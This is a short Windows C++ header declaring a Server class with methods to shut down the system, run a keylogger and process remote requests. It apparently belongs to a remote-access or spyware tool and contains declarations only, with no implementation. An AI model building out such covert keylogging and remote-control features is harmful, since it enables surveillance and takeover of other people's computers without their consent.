#ifndef SERVER_H_
#define SERVER_H_

#include "common/Request.h"
#include <windows.h>

class Server {
    public:
        void shutdownSystem();
        bool keylog(Request& request, Response &response);
        bool processRequest(Request& request, Response &response);
};


#endif